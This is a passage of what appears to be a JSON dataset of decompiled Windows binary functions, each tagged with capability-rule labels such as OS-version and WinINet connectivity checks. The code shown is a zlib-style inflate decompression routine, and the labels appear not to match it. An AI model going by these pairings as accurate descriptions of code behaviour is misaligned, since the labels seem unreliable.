        "decompiled_code": "\nuint __fastcall fcn.00403720(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    if (param_1 == 0) {\n        return 0xfffffffe;\n    }\n    *(param_1 + 0x18) = 0;\n    if (*(param_1 + 0x20) == 0) {\n        *(param_1 + 0x20) = fcn.00404ea0;\n        *(param_1 + 0x28) = 0;\n    }\n    if (*(param_1 + 0x24) == 0) {\n        *(param_1 + 0x24) = fcn.00404e80;\n    }\n    iVar3 = (**(param_1 + 0x20))(*(param_1 + 0x28), 1, 0x2530);\n    if (iVar3 == 0) {\n        return 0xfffffffc;\n    }\n    *(param_1 + 0x1c) = iVar3;\n    *(iVar3 + 8) = 2;\n    *(iVar3 + 0x24) = 0xf;\n    *(iVar3 + 0x34) = 0;\n    if ((param_1 != 0) && (puVar2 = *(param_1 + 0x1c),  puVar2 != NULL)) {\n        puVar1 = puVar2 + 0x14c;\n        puVar2[0x1b] = puVar1;\n        puVar2[0x14] = puVar1;\n        puVar2[0x13] = puVar1;\n        puVar2[7] = 0;\n        *(param_1 + 0x14) = 0;\n        *(param_1 + 8) = 0;\n        *(param_1 + 0x18) = 0;\n        *(param_1 + 0x30) = 1;\n        *puVar2 = 0;\n        puVar2[1] = 0;\n        puVar2[3] = 0;\n        puVar2[5] = 0x8000;\n        puVar2[8] = 0;\n        puVar2[10] = 0;\n        puVar2[0xb] = 0;\n        puVar2[0xc] = 0;\n        puVar2[0xe] = 0;\n        puVar2[0xf] = 0;\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 570
    },
    "00403840": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00403840(uint8_t **param_1)\n\n{\n    uint32_t **arg_ch;\n    uint8_t uVar1;\n    ushort uVar2;\n    uint32_t *puVar3;\n    uint8_t *puVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint8_t *puVar10;\n    uint32_t *extraout_ECX;\n    uint32_t uVar11;\n    uint32_t *puVar12;\n    uint32_t extraout_EDX;\n    uint32_t uVar13;\n    uint8_t *puVar14;\n    uint32_t uVar15;\n    uint8_t *puVar16;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint8_t *var_30h;\n    uint8_t *var_2ch;\n    int32_t var_28h;\n    uint8_t *var_24h;\n    uint8_t *var_20h;\n    uint8_t *var_1ch;\n    uint8_t *var_18h;\n    uint var_14h;\n    uint8_t *var_10h;\n    uint8_t *var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    uint32_t uVar7;\n    \n    if ((((param_1 == NULL) || (puVar3 = param_1[7],  puVar3 == NULL)) || (var_1ch = param_1[3],  var_1ch == NULL)) ||\n       ((puVar10 = *param_1,  puVar10 == NULL && (param_1[1] != NULL)))) {\n        return -2;\n    }\n    if (*puVar3 == 0xb) {\n        *puVar3 = 0xc;\n    }\n    var_20h = param_1[4];\n    puVar4 = param_1[1];\n    uVar13 = puVar3[0xe];\n    var_28h = 0;\n    uVar11 = *puVar3;\n    uVar15 = puVar3[0xf];\n    puVar12 = puVar3;\n    var_10h = puVar10;\n    var_18h = var_20h;\n    puVar14 = puVar4;\n    var_ch = puVar4;\n    var_4h = uVar13;\njoined_r0x004038b4:\n    if (0x1c < uVar11) {\ncode_r0x00404623:\n        return -2;\n    }\n    // switch table (29 cases) at 0x404744\n    switch(*(uVar11 * 4 + 0x404744)) {\n    case 0x4038c8:\n        uVar11 = uVar13;\n        if (puVar12[2] != 0) {\n            for (; uVar13 = var_4h,  var_4h = uVar13,  uVar15 < 0x10; uVar15 = uVar15 + 8) {\n                if (puVar14 == NULL) goto code_r0x0040467e;\n                uVar1 = *puVar10;\n                puVar14 = puVar14 + -1;\n                puVar10 = puVar10 + 1;\n                uVar11 = uVar11 + (uVar1 << (uVar15 & 0x1f));\n                var_10h = puVar10;\n                var_ch = puVar14;\n                var_4h = uVar11;\n            }\n            if (((uVar11 >> 8) + (uVar11 & 0xff) * 0x100) % 0x1f == 0) {\n                if ((uVar13 & 0xf) == 8) {\n                    var_4h = uVar13 >> 4;\n                    uVar11 = (var_4h & 0xf) + 8;\n                    uVar15 = uVar15 - 4;\n                    if (uVar11 < puVar3[9] || uVar11 == puVar3[9]) {\n                        puVar3[5] = 1 << uVar11;\n                        puVar16 = fcn.004047d0(0);\n                        param_1[0xc] = puVar16;\n                        *puVar3 = ~(uVar13 >> 0xc) & 2 | 9;\n                        uVar13 = 0;\n                        puVar3[6] = puVar16;\n                        var_4h = 0;\n                        uVar15 = 0;\n                        puVar12 = puVar3;\n                        goto code_r0x00404618;\n                    }\n                    param_1[6] = 0x4020d4;\n                    puVar12 = puVar3;\n                    uVar13 = var_4h;\n                }\n                else {\n                    param_1[6] = 0x4020b8;\n                    puVar12 = puVar3;\n                }\n            }\n            else {\n                param_1[6] = 0x4020a0;\n                puVar12 = puVar3;\n            }\n            goto code_r0x00404612;\n        }\n        *puVar12 = 0xc;\n        goto code_r0x00404618;\n    case 0x4039b4:\n        for (; uVar15 < 0x20; uVar15 = uVar15 + 8) {\n            if (puVar14 == NULL) goto code_r0x0040467e;\n            uVar1 = *puVar10;\n            puVar14 = puVar14 + -1;\n            puVar10 = puVar10 + 1;\n            uVar13 = uVar13 + (uVar1 << (uVar15 & 0x1f));\n            var_10h = puVar10;\n            var_ch = puVar14;\n            var_4h = uVar13;\n        }\n        puVar16 = (uVar13 >> 8 & 0xff00) + ((uVar13 & 0xff00) + uVar13 * 0x10000) * 0x100 + (uVar13 >> 0x18);\n        puVar3[6] = puVar16;\n        param_1[0xc] = puVar16;\n        uVar13 = 0;\n        var_4h = 0;\n        uVar15 = 0;\n        *puVar3 = 10;\n        puVar12 = puVar3;\n    case 0x403a20:\n        if (puVar12[3] == 0) {\n            param_1[3] = var_1ch;\n            param_1[4] = var_18h;\n            param_1[1] = puVar14;\n            puVar3[0xf] = uVar15;\n            *param_1 = puVar10;\n            puVar3[0xe] = uVar13;\n            return 2;\n        }\n        puVar16 = fcn.004047d0(0);\n        param_1[0xc] = puVar16;\n        puVar3[6] = puVar16;\n        *puVar3 = 0xb;\n        puVar12 = puVar3;\n        uVar13 = var_4h;\ncode_r0x00403a4d:\n        if (puVar12[1] == 0) {\n            for (; uVar15 < 3; uVar15 = uVar15 + 8) {\n                if (puVar14 == NULL) goto code_r0x0040467e;\n                uVar1 = *puVar10;\n                puVar14 = puVar14 + -1;\n                puVar10 = puVar10 + 1;\n                uVar13 = uVar13 + (uVar1 << (uVar15 & 0x1f));\n                puVar12 = puVar3;\n                var_10h = puVar10;\n                var_ch = puVar14;\n                var_4h = uVar13;\n            }\n            puVar12[1] = uVar13 & 1;\n    // switch table (4 cases) at 0x4047b8\n            switch(uVar13 >> 1 & 3) {\n            case 0:\n                uVar13 = uVar13 >> 3;\n                *puVar12 = 0xd;\n                uVar15 = uVar15 - 3;\n                var_4h = uVar13;\n                break;\n            case 1:\n                fcn.00403700();\n                uVar13 = extraout_EDX >> 2;\n                *extraout_ECX = 0x12;\n                uVar15 = uVar15 - 3;\n                puVar12 = extraout_ECX;\n                var_4h = uVar13;\n                break;\n            case 2:\n                uVar13 = uVar13 >> 3;\n                *puVar12 = 0xf;\n                uVar15 = uVar15 - 3;\n                var_4h = uVar13;\n                break;\n            case 3:\n                *puVar12 = 0x1b;\n                param_1[6] = 0x4020e8;\n            default:\n                uVar13 = uVar13 >> 3;\n                uVar15 = uVar15 - 3;\n                var_4h = uVar13;\n            }\n        }\n        else {\n            uVar13 = uVar13 >> (uVar15 & 7);\n            uVar15 = uVar15 - (uVar15 & 7);\n            *puVar3 = 0x18;\n            puVar12 = puVar3;\n            var_4h = uVar13;\n        }\ncode_r0x00404618:\n        uVar11 = *puVar12;\n        goto joined_r0x004038b4;\n    case 0x403a4d:\n        goto code_r0x00403a4d;\n    case 0x403b13:\n        var_4h = uVar13 >> (uVar15 & 7);\n        for (uVar15 = uVar15 - (uVar15 & 7); uVar15 < 0x20; uVar15 = uVar15 + 8) {\n            if (puVar14 == NULL) goto code_r0x0040467e;\n            uVar1 = *puVar10;\n            puVar14 = puVar14 + -1;\n            puVar10 = puVar10 + 1;\n            var_4h = var_4h + (uVar1 << (uVar15 & 0x1f));\n            var_10h = puVar10;\n            var_ch = puVar14;\n        }\n        if ((var_4h & 0xffff) != ~var_4h >> 0x10) {\n            param_1[6] = 0x4020fc;\n            puVar12 = puVar3;\n            uVar13 = var_4h;\n            goto code_r0x00404612;\n        }\n        uVar13 = 0;\n        puVar3[0x10] = var_4h & 0xffff;\n        var_4h = 0;\n        uVar15 = 0;\n        *puVar3 = 0xe;\n        puVar12 = puVar3;\n    case 0x403b83:\n        puVar16 = puVar12[0x10];\n        if (puVar16 == NULL) {\ncode_r0x00404234:\n            *puVar12 = 0xb;\n        }\n        else {\n            if (puVar14 < puVar16) {\n                puVar16 = puVar14;\n            }\n            if (var_18h < puVar16) {\n                puVar16 = var_18h;\n            }\n            if (puVar16 == NULL) break;\n            fcn.00404e60(puVar16);\n            var_18h = var_18h + -puVar16;\n            var_1ch = var_1ch + puVar16;\n            puVar14 = puVar14 + -puVar16;\n            puVar10 = puVar10 + puVar16;\n            puVar3[0x10] = puVar3[0x10] - puVar16;\n            puVar12 = puVar3;\n            uVar13 = var_4h;\n            var_10h = puVar10;\n            var_ch = puVar14;\n        }\n        goto code_r0x00404618;\n    case 0x403bd4:\n        for (; uVar15 < 0xe; uVar15 = uVar15 + 8) {\n            if (puVar14 == NULL) goto code_r0x0040467e;\n            uVar1 = *puVar10;\n            puVar14 = puVar14 + -1;\n            puVar10 = puVar10 + 1;\n            uVar13 = uVar13 + (uVar1 << (uVar15 & 0x1f));\n            puVar12 = puVar3;\n            var_10h = puVar10;\n            var_ch = puVar14;\n            var_4h = uVar13;\n        }\n        puVar12[0x18] = (uVar13 & 0x1f) + 0x101;\n        uVar11 = uVar13 >> 10;\n        puVar12[0x19] = (uVar13 >> 5 & 0x1f) + 1;\n        uVar13 = uVar13 >> 0xe;\n        uVar15 = uVar15 - 0xe;\n        puVar12[0x17] = (uVar11 & 0xf) + 4;\n        var_4h = uVar13;\n        if ((0x11e < puVar12[0x18]) || (0x1e < puVar12[0x19])) {\n            param_1[6] = 0x40211c;\n            goto code_r0x00404612;\n        }\n        puVar12[0x1a] = 0;\n        *puVar12 = 0x10;\n    case 0x403c5b:\n        puVar16 = puVar10;\n        if (puVar12[0x1a] < puVar12[0x17]) {\n            do {\n                for (; puVar10 = var_10h,  var_10h = puVar10,  uVar15 < 3; uVar15 = uVar15 + 8) {\n                    if (puVar14 == NULL) goto code_r0x0040467e;\n                    puVar14 = puVar14 + -1;\n                    var_10h = puVar16 + 1;\n                    var_4h = uVar13 + (*puVar16 << (uVar15 & 0x1f));\n                    uVar13 = var_4h;\n                    puVar16 = var_10h;\n                    var_ch = puVar14;\n                }\n                *(puVar3 + *(puVar3[0x1a] * 2 + 0x401ea0) * 2 + 0x70) = uVar13 & 7;\n                puVar3[0x1a] = puVar3[0x1a] + 1;\n                var_4h = uVar13 >> 3;\n                uVar15 = uVar15 - 3;\n                puVar12 = puVar3;\n                uVar13 = var_4h;\n                puVar16 = puVar10;\n            } while (puVar3[0x1a] < puVar3[0x17]);\n        }\n        uVar13 = puVar12[0x1a];\n        while (uVar13 < 0x13) {\n            *(puVar12 + *(puVar12[0x1a] * 2 + 0x401ea0) * 2 + 0x70) = 0;\n            puVar12[0x1a] = puVar12[0x1a] + 1;\n            uVar13 = puVar12[0x1a];\n        }\n        puVar12[0x1b] = puVar12 + 0x14c;\n        puVar12[0x13] = puVar12 + 0x14c;\n        puVar12[0x15] = 7;\n        var_28h = fcn.00404ec0(0x13, puVar12 + 0x1b, puVar12 + 0x15, puVar3 + 0xbc);\n        uVar13 = var_4h;\n        if (var_28h != 0) {\n            param_1[6] = 0x402140;\n            puVar12 = puVar3;\n            goto code_r0x00404612;\n        }\n        puVar3[0x1a] = 0;\n        *puVar3 = 0x11;\n        puVar12 = puVar3;\ncode_r0x00403d57:\n        var_24h = puVar12[0x1a];\n        puVar10 = var_10h;\n        if (var_24h < puVar12[0x19] + puVar12[0x18]) {\n            do {\n                uVar11 = (1 << (puVar12[0x15] & 0x1f)) - 1;\n                uVar7 = *(puVar3[0x13] + (uVar11 & uVar13) * 4);\n                if (uVar15 < (uVar7 >> 8 & 0xff)) {\n                    do {\n                        if (puVar14 == NULL) goto code_r0x0040467e;\n                        uVar1 = *puVar10;\n                        puVar14 = puVar14 + -1;\n                        puVar10 = puVar10 + 1;\n                        uVar13 = uVar13 + (uVar1 << (uVar15 & 0x1f));\n                        uVar15 = uVar15 + 8;\n                        uVar7 = *(puVar3[0x13] + (uVar11 & uVar13) * 4);\n                        var_10h = puVar10;\n                        var_ch = puVar14;\n                        var_4h = uVar13;\n                    } while (uVar15 < (uVar7 >> 8 & 0xff));\n                }\n                var_2ch._2_2_ = uVar7 >> 0x10;\n                if (uVar7 >> 0x10 < 0x10) {\n                    puVar16 = puVar10;\n                    puVar10 = var_10h;\n                    for (; var_10h = puVar10,  uVar15 < (uVar7 >> 8 & 0xff); uVar15 = uVar15 + 8) {\n                        if (puVar14 == NULL) goto code_r0x0040467e;\n                        uVar1 = *puVar16;\n                        puVar14 = puVar14 + -1;\n                        puVar16 = puVar16 + 1;\n                        uVar13 = var_4h + (uVar1 << (uVar15 & 0x1f));\n                        puVar10 = puVar16;\n                        var_ch = puVar14;\n                        var_4h = uVar13;\n                    }\n                    uVar11 = uVar7 >> 8 & 0xff;\n                    uVar13 = uVar13 >> (uVar11 & 0x1f);\n                    uVar15 = uVar15 - uVar11;\n                    *(puVar3 + var_24h * 2 + 0x70) = var_2ch._2_2_;\n                    puVar3[0x1a] = puVar3[0x1a] + 1;\n                }\n                else {\n                    if (var_2ch._2_2_ == 0x10) {\n                        uVar11 = uVar7 >> 8 & 0xff;\n                        if (uVar15 < uVar11 + 2) {\n                            do {\n                                if (puVar14 == NULL) goto code_r0x0040467e;\n                                uVar1 = *puVar10;\n                                puVar14 = puVar14 + -1;\n                                puVar10 = puVar10 + 1;\n                                uVar13 = uVar13 + (uVar1 << (uVar15 & 0x1f));\n                                uVar15 = uVar15 + 8;\n                                var_10h = puVar10;\n                                var_ch = puVar14;\n                                var_4h = uVar13;\n                            } while (uVar15 < uVar11 + 2);\n                        }\n                        uVar13 = uVar13 >> (uVar11 & 0x1f);\n                        uVar15 = uVar15 - uVar11;\n                        if (var_24h == NULL) {\n                            param_1[6] = 0x40215c;\n                            puVar12 = puVar3;\n                            var_4h = uVar13;\n                            goto code_r0x00404612;\n                        }\n                        uVar2 = *(puVar3 + var_24h * 2 + 0x6e);\n                        iVar9 = (uVar13 & 3) + 3;\n                        uVar13 = uVar13 >> 2;\n                        uVar15 = uVar15 - 2;\n                    }\n                    else {\n                        uVar11 = uVar7 >> 8 & 0xff;\n                        if (var_2ch._2_2_ == 0x11) {\n                            if (uVar15 < uVar11 + 3) {\n                                do {\n                                    if (puVar14 == NULL) goto code_r0x0040467e;\n                                    uVar1 = *puVar10;\n                                    puVar14 = puVar14 + -1;\n                                    puVar10 = puVar10 + 1;\n                                    uVar13 = uVar13 + (uVar1 << (uVar15 & 0x1f));\n                                    uVar15 = uVar15 + 8;\n                                    var_10h = puVar10;\n                                    var_ch = puVar14;\n                                    var_4h = uVar13;\n                                } while (uVar15 < uVar11 + 3);\n                            }\n                            uVar13 = uVar13 >> (uVar11 & 0x1f);\n                            iVar9 = (uVar13 & 7) + 3;\n                            uVar13 = uVar13 >> 3;\n                            iVar6 = -3 - uVar11;\n                        }\n                        else {\n                            if (uVar15 < uVar11 + 7) {\n                                do {\n                                    if (puVar14 == NULL) goto code_r0x0040467e;\n                                    uVar1 = *puVar10;\n                                    puVar14 = puVar14 + -1;\n                                    puVar10 = puVar10 + 1;\n                                    uVar13 = uVar13 + (uVar1 << (uVar15 & 0x1f));\n                                    uVar15 = uVar15 + 8;\n                                    var_10h = puVar10;\n                                    var_ch = puVar14;\n                                    var_4h = uVar13;\n                                } while (uVar15 < uVar11 + 7);\n                            }\n                            uVar13 = uVar13 >> (uVar11 & 0x1f);\n                            iVar9 = (uVar13 & 0x7f) + 0xb;\n                            uVar13 = uVar13 >> 7;\n                            iVar6 = -7 - uVar11;\n                        }\n                        uVar15 = uVar15 + iVar6;\n                        uVar2 = 0;\n                    }\n                    puVar14 = var_ch;\n                    if (puVar3[0x19] + puVar3[0x18] < iVar9 + var_24h) {\n                        param_1[6] = 0x40215c;\n                        puVar12 = puVar3;\n                        var_4h = uVar13;\n                        goto code_r0x00404612;\n                    }\n                    for (; iVar9 != 0; iVar9 = iVar9 + -1) {\n                        *(puVar3 + puVar3[0x1a] * 2 + 0x70) = uVar2;\n                        puVar3[0x1a] = puVar3[0x1a] + 1;\n                        puVar10 = var_10h;\n                    }\n                }\n                var_24h = puVar3[0x1a];\n                puVar12 = puVar3;\n                var_4h = uVar13;\n            } while (var_24h < puVar3[0x19] + puVar3[0x18]);\n        }\n        if (*puVar12 == 0x1b) goto code_r0x00404618;\n        arg_ch = puVar12 + 0x1b;\n        *arg_ch = puVar12 + 0x14c;\n        puVar12[0x13] = puVar12 + 0x14c;\n        puVar12[0x15] = 9;\n        var_28h = fcn.00404ec0(puVar12[0x18], arg_ch, puVar12 + 0x15, puVar12 + 0xbc);\n        uVar13 = var_4h;\n        puVar10 = var_10h;\n        if (var_28h == 0) {\n            puVar3[0x14] = *arg_ch;\n            puVar3[0x16] = 6;\n            var_28h = fcn.00404ec0(puVar3[0x19], arg_ch, puVar3 + 0x16, puVar12 + 0xbc);\n            if (var_28h != 0) {\n                param_1[6] = 0x402194;\n                puVar12 = puVar3;\n                goto code_r0x00404612;\n            }\n            *puVar3 = 0x12;\n            puVar12 = puVar3;\ncode_r0x00404080:\n            if ((0x5 < puVar14) && (0x101 < var_18h)) {\n                param_1[3] = var_1ch;\n                param_1[1] = puVar14;\n                param_1[4] = var_18h;\n                puVar12[0xe] = uVar13;\n                puVar12[0xf] = uVar15;\n                *param_1 = var_10h;\n                fcn.00404a40();\n                var_1ch = param_1[3];\n                uVar15 = puVar3[0xf];\n                var_18h = param_1[4];\n                puVar14 = param_1[1];\n                puVar12 = puVar3;\n                uVar13 = puVar3[0xe];\n                puVar10 = *param_1;\n                var_10h = *param_1;\n                var_ch = puVar14;\n                var_4h = puVar3[0xe];\n                goto code_r0x00404618;\n            }\n            uVar8 = (1 << (puVar12[0x15] & 0x1f)) - 1;\n            uVar11 = puVar3[0x13];\n            uVar7 = *(uVar11 + (uVar8 & uVar13) * 4);\n            if (uVar15 < (uVar7 >> 8 & 0xff)) {\n                do {\n                    if (puVar14 == NULL) goto code_r0x0040467e;\n                    uVar1 = *puVar10;\n                    puVar14 = puVar14 + -1;\n                    puVar10 = puVar10 + 1;\n                    uVar13 = uVar13 + (uVar1 << (uVar15 & 0x1f));\n                    uVar15 = uVar15 + 8;\n                    uVar7 = *(uVar11 + (uVar8 & uVar13) * 4);\n                    var_10h = puVar10;\n                    var_ch = puVar14;\n                    var_4h = uVar13;\n                } while (uVar15 < (uVar7 >> 8 & 0xff));\n            }\n            cVar5 = uVar7;\n            uVar8 = uVar7;\n            if ((cVar5 != '\\0') && ((uVar7 & 0xf0) == 0)) {\n                uVar1 = uVar7 >> 8;\n                uVar8 = *(uVar11 + ((((1 << (cVar5 + uVar1 & 0x1f)) - 1U & var_4h) >> (uVar1 & 0x1f)) + (uVar7 >> 0x10))\n                                   * 4);\n                if (uVar15 < (uVar8 >> 8 & 0xff) + (uVar7 >> 8 & 0xff)) {\n                    do {\n                        if (var_ch == NULL) goto code_r0x0040467e;\n                        var_ch = var_ch + -1;\n                        uVar1 = *var_10h;\n                        var_10h = var_10h + 1;\n                        uVar13 = uVar7 >> 8 & 0xff;\n                        var_4h = var_4h + (uVar1 << (uVar15 & 0x1f));\n                        uVar1 = uVar13;\n                        uVar15 = uVar15 + 8;\n                        uVar8 = *(uVar11 + ((((1 << (cVar5 + uVar1 & 0x1f)) - 1U & var_4h) >> (uVar1 & 0x1f)) +\n                                           (uVar7 >> 0x10)) * 4);\n                    } while (uVar15 < (uVar8 >> 8 & 0xff) + uVar13);\n                }\n                uVar11 = uVar7 >> 8 & 0xff;\n                uVar13 = var_4h >> (uVar11 & 0x1f);\n                uVar15 = uVar15 - uVar11;\n                puVar14 = var_ch;\n            }\n            uVar11 = uVar8 >> 8 & 0xff;\n            uVar13 = uVar13 >> (uVar11 & 0x1f);\n            uVar15 = uVar15 - uVar11;\n            puVar3[0x10] = uVar8 >> 0x10;\n            puVar10 = var_10h;\n            var_4h = uVar13;\n            if (uVar8 == '\\0') {\n                *puVar3 = 0x17;\n                puVar12 = puVar3;\n                goto code_r0x00404618;\n            }\n            puVar12 = puVar3;\n            if ((uVar8 & 0x20) == 0) {\n                if ((uVar8 & 0x40) == 0) {\n                    puVar3[0x12] = uVar8 & 0xf;\n                    *puVar3 = 0x13;\ncode_r0x00404261:\n                    uVar11 = puVar12[0x12];\n                    if (uVar11 != 0) {\n                        for (; uVar15 < uVar11; uVar15 = uVar15 + 8) {\n                            if (puVar14 == NULL) goto code_r0x0040467e;\n                            uVar1 = *puVar10;\n                            puVar14 = puVar14 + -1;\n                            puVar10 = puVar10 + 1;\n                            uVar13 = uVar13 + (uVar1 << (uVar15 & 0x1f));\n                            var_10h = puVar10;\n                            var_ch = puVar14;\n                            var_4h = uVar13;\n                        }\n                        puVar3[0x10] = puVar3[0x10] + ((1 << (uVar11 & 0x1f)) - 1U & uVar13);\n                        uVar13 = uVar13 >> (uVar11 & 0x1f);\n                        uVar15 = uVar15 - uVar11;\n                        puVar12 = puVar3;\n                        var_4h = uVar13;\n                    }\n                    *puVar12 = 0x14;\ncode_r0x004042ba:\n                    uVar8 = (1 << (puVar12[0x16] & 0x1f)) - 1;\n                    uVar11 = puVar3[0x14];\n                    uVar7 = *(uVar11 + (uVar8 & uVar13) * 4);\n                    if (uVar15 < (uVar7 >> 8 & 0xff)) {\n                        do {\n                            if (puVar14 == NULL) goto code_r0x0040467e;\n                            uVar1 = *puVar10;\n                            puVar14 = puVar14 + -1;\n                            puVar10 = puVar10 + 1;\n                            uVar13 = uVar13 + (uVar1 << (uVar15 & 0x1f));\n                            uVar15 = uVar15 + 8;\n                            uVar7 = *(uVar11 + (uVar8 & uVar13) * 4);\n                            var_10h = puVar10;\n                            var_ch = puVar14;\n                            var_4h = uVar13;\n                        } while (uVar15 < (uVar7 >> 8 & 0xff));\n                    }\n                    uVar8 = uVar7;\n                    if ((uVar7 & 0xf0) == 0) {\n                        uVar1 = uVar7 >> 8;\n                        uVar8 = *(uVar11 + ((((1 << (uVar7 + uVar1 & 0x1f)) - 1U & var_4h) >> (uVar1 & 0x1f)) +\n                                           (uVar7 >> 0x10)) * 4);\n                        if (uVar15 < (uVar8 >> 8 & 0xff) + (uVar7 >> 8 & 0xff)) {\n                            do {\n                                if (var_ch == NULL) goto code_r0x0040467e;\n                                var_ch = var_ch + -1;\n                                uVar1 = *var_10h;\n                                var_10h = var_10h + 1;\n                                uVar13 = uVar7 >> 8 & 0xff;\n                                var_4h = var_4h + (uVar1 << (uVar15 & 0x1f));\n                                uVar1 = uVar13;\n                                uVar15 = uVar15 + 8;\n                                uVar8 = *(uVar11 + ((((1 << (uVar7 + uVar1 & 0x1f)) - 1U & var_4h) >> (uVar1 & 0x1f)) +\n                                                   (uVar7 >> 0x10)) * 4);\n                            } while (uVar15 < (uVar8 >> 8 & 0xff) + uVar13);\n                        }\n                        uVar11 = uVar7 >> 8 & 0xff;\n                        uVar13 = var_4h >> (uVar11 & 0x1f);\n                        uVar15 = uVar15 - uVar11;\n                    }\n                    uVar11 = uVar8 >> 8 & 0xff;\n                    uVar13 = uVar13 >> (uVar11 & 0x1f);\n                    uVar15 = uVar15 - uVar11;\n                    puVar14 = var_ch;\n                    puVar10 = var_10h;\n                    var_4h = uVar13;\n                    if ((uVar8 & 0x40) == 0) {\n                        puVar3[0x11] = uVar8 >> 0x10;\n                        puVar3[0x12] = uVar8 & 0xf;\n                        *puVar3 = 0x15;\n                        puVar12 = puVar3;\ncode_r0x00404415:\n                        uVar11 = puVar12[0x12];\n                        if (uVar11 != 0) {\n                            for (; uVar15 < uVar11; uVar15 = uVar15 + 8) {\n                                if (puVar14 == NULL) goto code_r0x0040467e;\n                                uVar1 = *puVar10;\n                                puVar14 = puVar14 + -1;\n                                puVar10 = puVar10 + 1;\n                                uVar13 = uVar13 + (uVar1 << (uVar15 & 0x1f));\n                                var_10h = puVar10;\n                                var_ch = puVar14;\n                                var_4h = uVar13;\n                            }\n                            puVar3[0x11] = puVar3[0x11] + ((1 << (uVar11 & 0x1f)) - 1U & uVar13);\n                            uVar13 = uVar13 >> (uVar11 & 0x1f);\n                            uVar15 = uVar15 - uVar11;\n                            puVar12 = puVar3;\n                            var_4h = uVar13;\n                        }\n                        if (puVar12[0x11] < var_20h + (puVar12[0xb] - var_18h) ||\n                            puVar12[0x11] == var_20h + (puVar12[0xb] - var_18h)) {\n                            *puVar12 = 0x16;\ncode_r0x0040448d:\n                            if (var_18h == NULL) break;\n                            uVar13 = puVar12[0x11];\n                            if (var_20h - var_18h < uVar13) {\n                                var_2ch = uVar13 - (var_20h - var_18h);\n                                var_24h = puVar12[0xc];\n                                if (var_24h < var_2ch) {\n                                    var_2ch = var_2ch + -var_24h;\n                                    var_24h = (puVar12[0xd] + puVar12[10]) - var_2ch;\n                                }\n                                else {\n                                    var_24h = var_24h + (puVar12[0xd] - var_2ch);\n                                }\n                                var_30h = puVar12[0x10];\n                                if (var_30h < var_2ch) goto code_r0x004044e8;\n                            }\n                            else {\n                                var_24h = var_1ch + -uVar13;\n                                var_30h = puVar12[0x10];\ncode_r0x004044e8:\n                                var_2ch = var_30h;\n                            }\n                            if (var_18h < var_2ch) {\n                                var_2ch = var_18h;\n                            }\n                            var_18h = var_18h + -var_2ch;\n                            puVar12[0x10] = var_30h - var_2ch;\n                            iVar9 = var_24h - var_1ch;\n                            do {\n                                *var_1ch = var_1ch[iVar9];\n                                var_1ch = var_1ch + 1;\n                                var_2ch = var_2ch + -1;\n                            } while (var_2ch != NULL);\n                            uVar13 = var_4h;\n                            puVar14 = var_ch;\n                            puVar10 = var_10h;\n                            if (puVar12[0x10] == 0) {\n                                *puVar12 = 0x12;\n                            }\n                            goto code_r0x00404618;\n                        }\n                        param_1[6] = 0x4021e0;\n                        puVar14 = var_ch;\n                    }\n                    else {\n                        param_1[6] = 0x4021c8;\n                        puVar12 = puVar3;\n                    }\n                }\n                else {\n                    param_1[6] = 0x4021ac;\n                }\n                goto code_r0x00404612;\n            }\n            goto code_r0x00404234;\n        }\n        param_1[6] = 0x402178;\n        puVar12 = puVar3;\ncode_r0x00404612:\n        *puVar12 = 0x1b;\n        goto code_r0x00404618;\n    case 0x403d57:\n        goto code_r0x00403d57;\n    case 0x404080:\n        goto code_r0x00404080;\n    case 0x404261:\n        goto code_r0x00404261;\n    case 0x4042ba:\n        goto code_r0x004042ba;\n    case 0x404415:\n        goto code_r0x00404415;\n    case 0x40448d:\n        goto code_r0x0040448d;\n    case 0x40453a:\n        if (var_18h != NULL) {\n            var_18h = var_18h + -1;\n            *var_1ch = *(puVar12 + 0x10);\n            *puVar12 = 0x12;\n            uVar13 = var_4h;\n            var_1ch = var_1ch + 1;\n            goto code_r0x00404618;\n        }\n        break;\n    case 0x404560:\n        if (puVar12[2] != 0) {\n            for (; uVar15 < 0x20; uVar15 = uVar15 + 8) {\n                if (puVar14 == NULL) goto code_r0x0040467e;\n                uVar1 = *puVar10;\n                puVar14 = puVar14 + -1;\n                puVar10 = puVar10 + 1;\n                uVar13 = uVar13 + (uVar1 << (uVar15 & 0x1f));\n                puVar12 = puVar3;\n                var_10h = puVar10;\n                var_ch = puVar14;\n                var_4h = uVar13;\n            }\n            iVar9 = var_20h - var_18h;\n            param_1[5] = param_1[5] + iVar9;\n            puVar12[7] = puVar12[7] + iVar9;\n            if (iVar9 != 0) {\n                puVar14 = fcn.004047d0(iVar9);\n                puVar3[6] = puVar14;\n                param_1[0xc] = puVar14;\n                uVar13 = var_4h;\n            }\n            var_20h = var_18h;\n            if (((uVar13 & 0xff00) + uVar13 * 0x10000) * 0x100 + (uVar13 >> 8 & 0xff00) + (uVar13 >> 0x18) != puVar3[6])\n            {\n                param_1[6] = 0x402200;\n                puVar12 = puVar3;\n                puVar14 = var_ch;\n                goto code_r0x00404612;\n            }\n            var_4h = 0;\n            uVar15 = 0;\n            puVar12 = puVar3;\n        }\n        *puVar12 = 0x1a;\n    case 0x40466b:\n        var_28h = 1;\n        break;\n    case 0x404623:\n        goto code_r0x00404623;\n    case 0x404674:\n        var_28h = -3;\n        break;\n    case 0x4046c6:\n        goto code_r0x004046c6;\n    }\ncode_r0x0040467e:\n    uVar13 = puVar3[10];\n    param_1[3] = var_1ch;\n    param_1[1] = var_ch;\n    puVar3[0xf] = uVar15;\n    param_1[4] = var_18h;\n    *param_1 = var_10h;\n    puVar3[0xe] = var_4h;\n    if (((uVar13 == 0) && ((0x17 < *puVar3 || (var_20h == var_18h)))) || (iVar9 = fcn.004035d0(),  iVar9 == 0)) {\n        iVar9 = var_20h - param_1[4];\n        param_1[5] = param_1[5] + iVar9;\n        param_1[2] = param_1[2] + (puVar4 - param_1[1]);\n        